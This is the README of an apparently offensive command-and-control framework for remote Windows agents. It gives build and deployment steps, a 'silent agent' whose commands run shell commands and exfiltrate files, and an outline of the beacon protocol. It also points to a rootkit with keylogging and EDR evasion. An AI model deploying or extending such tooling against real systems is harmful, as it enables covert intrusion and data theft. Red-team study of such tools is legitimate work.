# PULSE C2 Framework

![Python](https://img.shields.io/badge/Python-3.9+-blue)
![C++](https://img.shields.io/badge/C++-17-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)

![C2 screenshot](https://github.com/28Zaaky/Usermode-Rootkit/blob/82292f2a6d0c4f46ad9b3db686fc275e6ce17589/Capture%20d'%C3%A9cran%202025-12-12%20173844.png)

HTTPS Command & Control infrastructure with web dashboard for remote Windows agent management.

> **⚠️ Educational Use Only** - Illegal use = your responsibility.

## Features

- HTTPS C2 server with TLS encryption (Flask)
- Real-time web dashboard
- XOR + Base64 encrypted protocol
- SQLite database for persistent storage
- Remote shell, file exfiltration, beacon control
- Silent agent with no debug output

## Quick Start

**Server:**
```bash
cd server
pip install flask
python c2_server.py
```
Access dashboard: `https://localhost:8443`

**Client:**
```bash
build.bat
```

Edit [client/c2_client.cpp](client/c2_client.cpp#L162) to set your server IP:
```cpp
wstring c2ServerUrl = L"https://YOUR_SERVER_IP:8443";
```

## Commands

| Command | Syntax | Description |
|---------|--------|-------------|
| `shell` | `shell <cmd>` | Execute shell command |
| `exfil` | `exfil <path>` | Exfiltrate file (Base64) |
| `sleep` | `sleep <seconds>` | Change beacon interval |
| `ping` | `ping` | Test connectivity |
| `die` | `die` | Terminate agent |

## Protocol

**Encryption:** XOR + Base64  
**Key:** `Hostname + Username + "SecretKey2025"`  
**Transport:** HTTPS (port 8443)

```
Agent → POST /api/checkin → Server (get commands)
Agent → POST /api/result → Server (send results)
```

## Requirements

**Server:** Python 3.9+, Flask  
**Client:** MinGW-w64 GCC 15.2+, Windows SDK, C++17

## Related Project

This C2 framework is extracted from the [XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit) project. The full rootkit version includes a more complete C2 with over 15 commands, including process/file/registry hiding, SYSTEM privilege escalation, interactive reverse shells, keylogger functionality, DLL injection, and EDR evasion techniques. This standalone version provides the core C2 infrastructure for educational purposes and easy integration into custom projects.

## Contact

**Author:** 28zaakypro[@]proton[.]me  
